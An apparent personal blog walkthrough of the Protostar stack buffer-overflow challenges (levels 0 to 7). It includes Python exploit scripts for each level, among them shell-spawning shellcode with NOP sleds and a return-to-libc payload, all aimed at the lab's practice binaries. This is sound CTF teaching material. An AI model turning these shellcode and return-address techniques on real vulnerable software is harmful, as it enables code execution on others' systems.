---
author: Nithissh S
pubDatetime: 2020-06-07T15:22:00Z
modDatetime: 2020-06-07T09:12:47.400Z
title: Hacking My Way Through Protostar - A Noob's Guide to Buffer Overflows
slug: protostar-ctf
featured: false
draft: false
tags:
  - CTF
description:
  Walkthrough of Protostar from exploit exercises  
---

# Introduction

Hey there! 👋 After banging my head against the wall for weeks learning about buffer overflows, I thought I'd share my journey through the Protostar challenges. Trust me, if I can get through these, you can too!

## The Basics: What the Heck is a Buffer Overflow?

You know when you're pouring a drink and accidentally overflow your glass? That's basically what a buffer overflow is in programming. Your program has these containers (buffers) for storing data, and if you try to stuff more data than they can hold... well, things get messy.

## Stack0: Baby's First Buffer Overflow

When I first started Protostar, Stack0 looked intimidating. But it's actually pretty simple once you break it down.

Here's what's happening:
- The program has a buffer (think of it as a box) that can hold 64 characters
- There's also a variable called `modified` sitting right after it in memory
- Our job? Overflow that buffer to change `modified`

Let's look at the assembly (don't panic, I'll explain!):
```asm
80483fa:       sub    $0x60,%esp        ; Making room on the stack
80483fd:       movl   $0x0,0x5c(%esp)   ; Setting modified = 0
8048405:       lea    0x1c(%esp),%eax   ; Getting buffer's address
804840c:       call   804830c <gets@plt> ; Oh no, they used gets()!
```

The program uses `gets()` which is like that friend who never says "no" - it'll keep taking input until it hits a newline, regardless of buffer size. Bad for security, great for us! 

Here's our exploit:
```python
#!/usr/bin/env python

# Fill up the 64-byte buffer with 'A's
# Then add some 'X's to overflow into modified
SH = 'A'*64 + 'XXXX'
print(SH)
```

When I first got this working, I legit jumped out of my chair! 🎉

## Stack1: Being Picky About Our Overflow

Stack1 is like Stack0's slightly pickier sibling. Instead of just wanting any value in `modified`, it wants a specific one: 'dcba'.

```python
#!/usr/bin/env python

# Same deal as Stack0, but now we're being precise
SH = 'A'*64 + 'dcba'
print(SH)
```

## Stack2: Environment Variables - The Sneaky Way In

This one threw me for a loop at first. Instead of reading input directly, it pulls from an environment variable. Think of it as breaking in through the window instead of the door.

```python
#!/usr/bin/env python
import sys

SH = 'A'*64 + '\x0a\x0d\x0a\x0d'
sys.stdout.write(SH)
```

To run it:
```bash
env GREENIE="`python hack.py`" /opt/protostar/bin/stack2
```

Pro tip: I spent way too long getting weird results before realizing that environment variables can mess with your payload. Keep it clean!

## Stack3: Function Pointers - The Fun Begins

Now we're getting to the good stuff! Instead of just changing a value, we're hijacking a function pointer. It's like leaving a fake phone number that redirects to your actual number.

```python
#!/usr/bin/env python
import sys

# Address of our target function (win)
SH = 'A'*64 + '\x24\x84\x04\x08'
sys.stdout.write(SH)
```

Fun fact: I spent hours getting this wrong because I forgot about little-endian byte order. Remember: x86 reads bytes backwards! 

## Stack4: Return Address Shenanigans

This is where things clicked for me. We're not just overwriting variables anymore - we're controlling where the program goes after a function returns.

```python
#!/usr/bin/env python
import sys

# Need some extra padding to reach the return address
padding = 'BBBBCCCCDDDD'
ret_addr = '\xf4\x83\x04\x08'

SH = 'A'*64 + padding + ret_addr
sys.stdout.write(SH)
```

I probably spent a whole day just playing with different padding lengths. GDB became my best friend here.

## Stack5: Actually Running Our Own Code!

This one's my favorite. We're not just redirecting the program - we're making it run our own code! 

```python
#!/usr/bin/env python
import sys

# This is actual shellcode that spawns a shell
SHELL_CODE = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
NOP = "\x90"  # Our little sliding board of NOPs

ret_addr = "\xa0\xf7\xff\xbf"  # Where we want to land
old_ebp = "\x48\xf8\xff\xbf"   # Keep the stack happy

buff_size = 64

# Building our masterpiece
SH = NOP*32 + SHELL_CODE
SH = SH + NOP*(buff_size-len(SH))
SH = SH + NOP*8 + old_ebp + ret_addr

sys.stdout.write(SH + "\n")
```

The NOP sled (all those \x90s) is like a slip-n-slide that leads to our shellcode. As long as we land anywhere on it, we slide right into our code. Neat, right?

## Stack6: Return-to-libc - No Shell Code Allowed!

This level was a pain. They blocked us from executing code on the stack, so we had to get creative. Instead of writing our own code, we're using functions that already exist in the program's memory.

```python
#!/usr/bin/env python
import sys

# Addresses of functions we want to use
ret_addr = "\xb0\xff\xec\xb7"  # system()
old_ebp = "\xff\xff\xff\xbf"   # Any valid pointer will do
para = "\x8c\xf7\xff\xbf"      # Our command string
buff_size = 0x4c
cmd = "/usr/bin/id; echo "
exit_addr = "\xc0\x60\xec\xb7" # exit() - be nice, clean up after yourself

SH = cmd
SH = SH + 'A'*(buff_size-len(SH))
SH = SH + old_ebp + ret_addr + exit_addr + para

sys.stdout.write(SH + "\n")
```

## Stack7: Getting Fancy

The final boss! This one combines everything we've learned plus some new tricks.

```python
#!/usr/bin/env python
import sys

SHELL_CODE = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
NOP = "\x90"

# Found a nice 'jmp eax' instruction we can use
ret_addr = "\xeb\x85\x04\x08"
old_ebp = "\xff\xff\xff\xbf"

buff_size = 0x4c

SH = NOP*4 + SHELL_CODE
SH = SH + NOP*(buff_size-len(SH))
SH = SH + old_ebp + ret_addr

sys.stdout.write(SH + "\n")
```

## Tools That Saved My Bacon

1. **GDB** - Your best friend in this journey. Learn to love it.
   ```bash
   gdb ./binary
   break main
   run
   x/wx $esp  # Look at stack memory
   ```

2. **strace** - When you have no idea what's going wrong
   ```bash
   strace -i ./program
   ```

## Lessons Learned

After all this, here's what stuck with me:
- Always check input lengths (seriously, `gets()` is never your friend)
- Memory layout matters more than you think
- GDB is confusing at first but invaluable once you get used to it
- Stack protection exists for a reason!

## Wrapping Up

Buffer overflows might seem like black magic at first, but they're really just about understanding how programs use memory. Start small, be patient, and don't forget to take breaks when your brain starts melting! 

Remember: Use these powers for good! This stuff is super fun to learn, but always practice on systems you own or have permission to test.

Happy hacking! 🚀

PS: If you get stuck, don't worry - I probably spent twice as long as you figuring this stuff out. Keep at it!